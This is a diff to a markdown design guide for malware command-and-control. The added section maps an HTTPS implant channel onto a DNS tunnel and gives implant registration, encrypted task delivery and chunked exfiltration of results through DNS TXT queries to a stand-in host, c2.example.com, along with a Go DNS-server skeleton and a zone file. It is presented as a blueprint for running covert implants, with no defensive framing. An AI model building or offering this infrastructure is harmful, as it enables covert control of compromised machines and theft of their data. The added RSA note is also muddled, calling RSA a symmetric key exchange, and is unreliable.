@@ -168,6 +168,10 @@ server {
 
 ## 5. Putting It All Together
 
+# RSA Symmetric Key Exchange 
+- data encrypted w/ public key can only be decrypted w/ private key 
+- data encrypted w/ private key can only be decrypted w/ public key 
+
 1. **Registration**
   - Implant POSTs `{ uuid, pubkey }` to `/register`
   - Server stores session and returns JWT (or issues client cert out-of-band)
@@ -188,3 +192,152 @@ server {
 - **A robust session store** ties it all together: implant IDs, pubs keys, nonces, last seen, statuses.
 
 With this foundation you can scale to dozens—or hundreds—of implants, all securely talking to a single HTTPS listener.
+
+
+
+---
+
+Here’s how you can map each of those HTTPS‐based C2 features onto a DNS‐tunneled channel—still using per-implant IDs, key exchange, authenticated sessions, AES-GCM payloads, and a robust “session store,” but all piggy-backed over DNS queries and replies.
+
+---
+
+## 1. Implant Identification & Session Tracking
+
+1. **Initial Registration via TXT Query**
+    - **QNAME format**:
+      ```
+      reg.<BASE32(UUID)>.<BASE32(pubkey)>.c2.example.com
+      ```  
+    - Implant generates a v4 UUID and an EC or RSA keypair, Base32-encodes both, and does a DNS TXT lookup on that QNAME.
+    - Your authoritative DNS server (e.g. a Go/miekg/dns or PowerDNS Pipe backend) inspects the `reg.*` label, decodes `UUID` and `pubkey`, stores them in Redis/BoltDB along with `last_seen`, `nonce_counter = 0`, etc., and returns a TXT record containing:
+      ```json
+      {
+        "status":"ok",
+        "key_exchange_reply": "<BASE32(server_pubkey)>",
+        "session_token": "<BASE32(hmac or nonce)>"
+      }
+      ```  
+
+2. **Session Store**
+    - Same map of `implantID → { last_seen, pubkey, session_key, nonce_counter, status }` in Redis/BoltDB.
+    - TTLs on Redis keys allow stale implants to drop off automatically.
+
+3. **Heartbeat / Task Polling**
+    - Implant does a periodic TXT lookup on:
+      ```
+      task.<BASE32(UUID)>.<counter>.<BASE32(HMAC)>.c2.example.com
+      ```  
+      where `counter` increments each poll and `HMAC = HMAC-SHA256(session_key, UUID||counter)`.
+    - Server verifies HMAC, updates `last_seen`, increments its own counter, and responds with a TXT containing the next encrypted task blob (or “noop”):
+      ```json
+      {
+        "cmd":"<BASE32(AES-GCM(payload))>",
+        "nonce":"<BASE32(gcm_nonce)>"
+      }
+      ```  
+
+---
+
+## 2. Authentication & Session Management
+
+- **Symmetric HMAC**: After registration you derive a per-implant `session_key` (e.g. SHA256(shared_secret‖UUID)).
+- **In-label HMAC**: Every DNS query includes an HMAC over its labels. The server rejects any query with invalid or replayed HMACs (counter too low).
+- **Stateless on the wire**: DNS has no cookies or TLS certs, so embedding authentication data in the QNAME is the simplest approach.
+
+---
+
+## 3. Payload Encryption & Integrity
+
+1. **AES-GCM per-implant key**
+    - During registration, server and implant perform a simple EC Diffie-Hellman (or encrypt a random AES key under the implant’s pubkey) to agree on a 256-bit `aes_key`.
+2. **Encrypting Tasks**
+    - Server marshals a JSON command, runs
+      ```go
+      cipher, _ := aes.NewGCM(aesKey)
+      nonce := make([]byte, cipher.NonceSize())
+      rand.Read(nonce)
+      ct := cipher.Seal(nil, nonce, []byte(cmdJSON), nil)
+      ```
+    - Base32-encode `nonce‖ct`, embed in the TXT reply.
+3. **Exfilitration ( implant → server )**
+    - Implant encrypts its results the same way, then splits the Base32 result into chunks and issues multiple TXT queries of the form:
+      ```
+      res.<BASE32(UUID)>.<counter>.<chunk1>.<HMAC>.c2.example.com
+      res.<BASE32(UUID)>.<counter+1>.<chunk2>.<HMAC>.c2.example.com
+      … 
+      ```  
+    - Server reassembles chunks in order, decrypts, verifies, and writes to your session store.
+
+---
+
+## 4. Setting Up Your DNS Tunnel Server
+
+### a) Authoritative DNS Service
+- **Go + miekg/dns** example skeleton:
+  ```go
+  import "github.com/miekg/dns"
+
+  func main() {
+    dns.HandleFunc("c2.example.com.", handleC2)
+    server := &dns.Server{Addr: ":53", Net: "udp"}
+    log.Fatal(server.ListenAndServe())
+  }
+
+  func handleC2(w dns.ResponseWriter, r *dns.Msg) {
+    q := r.Question[0].Name
+    labels := dns.SplitDomainName(q)
+    switch labels[0] {
+    case "reg":
+      handleRegister(labels[1:], w, r)
+    case "task":
+      handleTask(labels[1:], w, r)
+    case "res":
+      handleResult(labels[1:], w, r)
+    default:
+      // NXDOMAIN or empty TXT
+    }
+  }
+  ```
+- **PowerDNS Pipe Backend**: implement exactly the same logic in your favorite language, reading queries from stdin and writing answers to stdout.
+
+### b) DNS Zone Configuration
+```bind
+$ORIGIN c2.example.com.
+@   IN NS   ns1.c2.example.com.
+ns1 IN A    10.0.0.1
+```
+Your custom server becomes the authoritative nameserver for `c2.example.com.`.
+
+---
+
+## 5. Putting It All Together
+
+1. **Registration**
+    - Implant does TXT lookup on
+      ```
+      reg.<uuid>.<pubkey>.c2.example.com
+      ```
+    - Server records session, returns its pubkey + session token in TXT.
+2. **Polling / Task Fetch**
+    - Implant does TXT lookup on
+      ```
+      task.<uuid>.<ctr>.<hmac>.c2.example.com
+      ```
+    - Server verifies HMAC, responds with AES-GCM-encrypted command blob (or “noop”).
+3. **Result Upload**
+    - Implant encrypts output, splits into chunks, then sends a sequence of TXT lookups on
+      ```
+      res.<uuid>.<ctr>.<data>.c2.example.com
+      ```
+    - Server reassembles, decrypts, verifies nonces, stores results.
+
+---
+
+### Key Takeaways
+
+- **QNAME carries your metadata** (UUID, counters, HMACs) in place of HTTP headers/JWTs.
+- **TXT records carry payloads**, encrypted with AES-GCM for confidentiality and integrity.
+- **HMAC-in-label** enforces authenticity and replay protection.
+- **Custom DNS server** (Go/miekg or PowerDNS) injects logic at registration, polling, and result endpoints—all over UDP/TCP port 53.
+
+With this blueprint you get the same per-implant session tracking, authenticated key exchange, replay-protected polling, and end-to-end encrypted payloads—only now tunneled through DNS instead of HTTPS.
